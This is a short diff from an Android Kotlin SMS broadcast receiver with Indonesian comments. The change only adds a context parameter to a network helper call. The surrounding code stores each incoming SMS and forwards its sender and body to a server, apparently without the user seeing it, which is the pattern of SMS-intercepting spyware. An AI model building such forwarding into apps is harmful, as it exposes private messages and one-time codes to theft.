@@ -20,7 +20,7 @@ class SmsReceiver : BroadcastReceiver() {
                 SmsStorage.saveSms(context, sender, body, timestamp)
 
                 // Kirim ke server (jika ada koneksi)
-                NetworkHelper.sendSmsData(sender, body, timestamp)
+                NetworkHelper.sendSmsData(context, sender, body, timestamp)
 
                 Log.d("SmsReceiver", "Tertangkap SMS dari $sender: $body")
             }
